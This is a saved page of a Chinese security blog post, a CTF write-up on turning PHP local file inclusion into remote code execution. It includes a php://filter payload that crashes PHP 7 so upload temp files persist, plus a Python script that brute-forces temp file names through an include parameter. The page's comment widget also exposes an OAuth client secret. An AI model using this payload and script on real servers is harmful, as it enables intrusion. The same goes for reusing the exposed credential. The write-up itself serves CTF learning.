@@ -1,0 +1,608 @@
+
+ <!DOCTYPE HTML>
+<html >
+<head>
+  <meta charset="UTF-8">
+  
+    <title>LFI 2 RCE | H o o k | 潜心习安全</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="hook">
+    
+
+    
+    <meta name="description" content="从本地文件包含到远程代码执行RealWorld CTF比赛期间和队友熬夜成功一血打下TP-Link摄像头，撒花兴喜🎉，但因为0day未修复的原因就暂不记录，记录下挺有意思的一道web题。题目来源于RealWorld CTF中的The Return of One Line PHP，起初题目来源于🍊在HITCON2018出的One Line PHP Change，利用filter与session.">
+<meta name="keywords" content="LFI">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LFI 2 RCE">
+<meta property="og:url" content="https://gloxec.github.com/2018/12/04/LFI 2 RCE/index.html">
+<meta property="og:site_name" content="H o o k | 潜心习安全">
+<meta property="og:description" content="从本地文件包含到远程代码执行RealWorld CTF比赛期间和队友熬夜成功一血打下TP-Link摄像头，撒花兴喜🎉，但因为0day未修复的原因就暂不记录，记录下挺有意思的一道web题。题目来源于RealWorld CTF中的The Return of One Line PHP，起初题目来源于🍊在HITCON2018出的One Line PHP Change，利用filter与session.">
+<meta property="og:image" content="https://gloxec.github.com/images/LFI%202%20RCE/1.png">
+<meta property="og:image" content="https://gloxec.github.com/images/LFI%202%20RCE/2.png">
+<meta property="og:image" content="https://gloxec.github.com/images/LFI%202%20RCE/3.png">
+<meta property="og:image" content="https://gloxec.github.com/images/LFI%202%20RCE/4.png">
+<meta property="og:updated_time" content="2018-12-04T08:37:29.919Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="LFI 2 RCE">
+<meta name="twitter:description" content="从本地文件包含到远程代码执行RealWorld CTF比赛期间和队友熬夜成功一血打下TP-Link摄像头，撒花兴喜🎉，但因为0day未修复的原因就暂不记录，记录下挺有意思的一道web题。题目来源于RealWorld CTF中的The Return of One Line PHP，起初题目来源于🍊在HITCON2018出的One Line PHP Change，利用filter与session.">
+<meta name="twitter:image" content="https://gloxec.github.com/images/LFI%202%20RCE/1.png">
+
+    
+    <link rel="alternative" href="/atom.xml" title="H o o k | 潜心习安全" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.png" alt="H o o k | 潜心习安全" title="H o o k | 潜心习安全"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="H o o k | 潜心习安全">H o o k | 潜心习安全</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:gloxec.github.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/12/04/LFI 2 RCE/" title="LFI 2 RCE" itemprop="url">LFI 2 RCE</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="hook" target="_blank" itemprop="author">hook</a>
+		
+  <p class="article-time">
+    <time datetime="2018-12-04T03:15:37.000Z" itemprop="datePublished"> Published 2018-12-04</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#从本地文件包含到远程代码执行"><span class="toc-number">1.</span> <span class="toc-text">从本地文件包含到远程代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#文件流保存"><span class="toc-number">1.1.</span> <span class="toc-text">文件流保存</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#临时文件的保留"><span class="toc-number">1.2.</span> <span class="toc-text">临时文件的保留</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php7的异常退出"><span class="toc-number">1.3.</span> <span class="toc-text">php7的异常退出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#碰撞"><span class="toc-number">1.4.</span> <span class="toc-text">碰撞</span></a></li></ol></li></ol>
+		
+		</div>
+		
+		<h1 id="从本地文件包含到远程代码执行"><a href="#从本地文件包含到远程代码执行" class="headerlink" title="从本地文件包含到远程代码执行"></a>从本地文件包含到远程代码执行</h1><p><strong>RealWorld CTF</strong>比赛期间和队友熬夜成功一血打下<strong>TP-Link摄像头</strong>，撒花兴喜🎉，但因为0day未修复的原因就暂不记录，记录下挺有意思的一道web题。<br>题目来源于<strong>RealWorld CTF</strong>中的<strong>The Return of One Line PHP</strong>，起初题目来源于🍊在<strong>HITCON2018</strong>出的<strong>One Line PHP Change</strong>，利用filter与session.upload构造开头@&lt;?php文件流来进行RCE。</p>
+<a id="more"></a>
+<h2 id="文件流保存"><a href="#文件流保存" class="headerlink" title="文件流保存"></a>文件流保存</h2><p>php在处理请求数据包时，若包含一个文件上传的流，那么会先将包中的文件流保存到临时目录下，并且以<code>php+6位随机数</code>名称保存，经过用户编写好的代码处理完毕后，再unlink掉临时保存的文件。<br><img src="/images/LFI 2 RCE/1.png" alt=""><br>详见:<br><a href="https://github.com/bl4de/security_whitepapers/blob/master/PHP_LFI_rfc1867_temporary_files.pdf" target="_blank" rel="noopener">PHP LFI rfc1867 temporary file</a></p>
+<h2 id="临时文件的保留"><a href="#临时文件的保留" class="headerlink" title="临时文件的保留"></a>临时文件的保留</h2><p>这些临时文件在被php删除前有一段空白时间<br><img src="/images/LFI 2 RCE/2.png" alt=""><br>比赛时刚开始队友想到用请求无法访问的地址如<code>https://www.google.com</code>来让处理超时一段时间，最终测试发现临时文件在服务器上最多能存留30s的时间，接着被php删除。<br>刚开始思路就是大量请求，尽可能让在30s的时间内生成大量临时文件，然后去碰撞到这些文件，但6位的随机数在30秒中碰撞实在是要太欧皇才可以。</p>
+<h2 id="php7的异常退出"><a href="#php7的异常退出" class="headerlink" title="php7的异常退出"></a>php7的异常退出</h2><p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure></p>
+<p>详情链接:<br><a href="https://hackmd.io/s/Hk-2nUb3Q?from=singlemessage&amp;isappinstalled=0" target="_blank" rel="noopener">poc详细分析</a></p>
+<p>若是能将临时文件永久保留下来，生成大量临时文件再去碰撞那么机率将会高很多。<br>上面的poc就可以导致php7全版本在处理时异常退出，那么临时文件就不会因为执行后面的unlink操作而被删除。</p>
+<h2 id="碰撞"><a href="#碰撞" class="headerlink" title="碰撞"></a>碰撞</h2><p><img src="/images/LFI 2 RCE/3.png" alt=""><br>最终花了将近39分钟碰撞到了生成的临时文件，再去包含就可以正常拿到shell了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">临时文件数量</span><br><span class="line">$ ls ./php* | wc</span><br><span class="line">  23278   23278  279336</span><br></pre></td></tr></table></figure>
+<p><img src="/images/LFI 2 RCE/4.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import requests, random</span><br><span class="line">import datetime</span><br><span class="line"></span><br><span class="line">charset = &quot;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890&quot;</span><br><span class="line"></span><br><span class="line">host = &quot;127.0.0.1&quot;</span><br><span class="line">port = 8001</span><br><span class="line">base_url = &quot;http://%s:%d&quot; % (host, port)</span><br><span class="line">starttime = datetime.datetime.now()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_filename():</span><br><span class="line">    ret = &quot;&quot;</span><br><span class="line">    for i in range(6):</span><br><span class="line">        ret += random.choice(charset)</span><br><span class="line">    return ret</span><br><span class="line"></span><br><span class="line">def brute_force_tmp_files():</span><br><span class="line">    filename = get_filename()</span><br><span class="line">    url = &quot;&#123;&#125;/index.php?orange=/tmp/php&#123;&#125;&quot;.format(base_url, filename)</span><br><span class="line">    print &quot;php&quot; + filename</span><br><span class="line">    try:</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        if b&apos;flag&apos; in r.text:</span><br><span class="line">            print(&quot;[+] Include success!&quot;)</span><br><span class="line">            print(url)</span><br><span class="line">            endtime = datetime.datetime.now()</span><br><span class="line">            print (endtime-starttime).seconds</span><br><span class="line">            exit()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    flag = False</span><br><span class="line">    while 1:</span><br><span class="line">        brute_force_tmp_files()</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/Web/">Web</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/LFI/">LFI</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="https://gloxec.github.com/2018/12/04/LFI 2 RCE/" data-title="LFI 2 RCE | H o o k | 潜心习安全" data-tsina="" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+
+<div class="next">
+<a href="/2018/08/09/Use Frida to decrypt communication packets and interact with Burpsuite/"  title="Use Frida to decrypt communication packets and interact with Burpsuite">
+ <strong>下一篇：</strong><br/> 
+ <span>Use Frida to decrypt communication packets and interact with Burpsuite
+</span>
+</a>
+</div>
+
+</nav>
+
+	<section id="comments" class="comment">
+  <div id="blog_comment"></div>
+  <script src="https://cdn.jsdelivr.net/gh/theme-next/theme-next-gitment@1/gitment.browser.js"></script>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/theme-next/theme-next-gitment@1/default.css"/>
+  <script>
+  var gitment = new Gitment({
+    id: window.location.pathname,
+    owner: 'gloxec',
+    repo: 'blog.comment.repo',
+    oauth: {
+      client_id: 'bfcfaca64e8f5e195f6e',
+      client_secret: 'e207a42d1b3165bcc2b07d34eb956fc5e4a0024b',
+    },
+  })
+  gitment.render('blog_comment')
+  </script>
+</section>
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#从本地文件包含到远程代码执行"><span class="toc-number">1.</span> <span class="toc-text">从本地文件包含到远程代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#文件流保存"><span class="toc-number">1.1.</span> <span class="toc-text">文件流保存</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#临时文件的保留"><span class="toc-number">1.2.</span> <span class="toc-text">临时文件的保留</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php7的异常退出"><span class="toc-number">1.3.</span> <span class="toc-text">php7的异常退出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#碰撞"><span class="toc-number">1.4.</span> <span class="toc-text">碰撞</span></a></li></ol></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  
+<div class="github-card">
+<p class="asidetitle">Github Card</p>
+<div class="github-card" data-github="gloxec" data-theme="medium"></div>
+<script type="text/javascript" src="//cdn.jsdelivr.net/github-cards/latest/widget.js" ></script>
+</div>
+
+
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/Mac/" title="Mac">Mac<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Web/" title="Web">Web<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/ctf/" title="ctf">ctf<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/iOS/" title="iOS">iOS<sup>2</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/misc/" title="misc">misc<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/pwn/" title="pwn">pwn<sup>8</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/ret2dl攻击/" title="ret2dl攻击">ret2dl攻击<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Mac-IDA/" title="Mac IDA">Mac IDA<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/fmt攻击/" title="fmt攻击">fmt攻击<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/函数签名/" title="函数签名">函数签名<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/frida/" title="frida">frida<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/debugger/" title="debugger">debugger<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/SSL解密/" title="SSL解密">SSL解密<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/memory-RWX/" title="memory-RWX">memory-RWX<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Mac-KDBG/" title="Mac KDBG">Mac KDBG<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Mac-SIP/" title="Mac SIP">Mac SIP<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/docker/" title="docker">docker<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/MachO格式/" title="MachO格式">MachO格式<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/writeup/" title="writeup">writeup<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/LFI/" title="LFI">LFI<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="http://bestwing.me" target="_blank" title="一个面向程序员交流分享的新一代社区">Swing</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.bodkin.ren" target="_blank" title="老锥">老锥</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://whereisk0shl.top" target="_blank" title="k0shl">k0shl</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://blog.imjun.net" target="_blank" title="杨君">杨君</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://4ch12dy.site" target="_blank" title="小学生">小学生</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://hello-sherlock.github.io" target="_blank" title="凌迟">凌迟</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://drops.org.cn" target="_blank" title="drop">drop</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://pcat.cnblogs.com" target="_blank" title="pcat">pcat</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://peterpan980927.cn" target="_blank" title="peterpan">peterpan</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> 如果想 <br/>
+			一切都还来的及</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		
+		<a href="https://github.com/gloxec" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		<a href="mailto:gloxec@gmail.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2019 
+		
+		<a href="/about" target="_blank" title="hook">hook</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?e6d1f421bbc9962127a50488f9ed37d1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
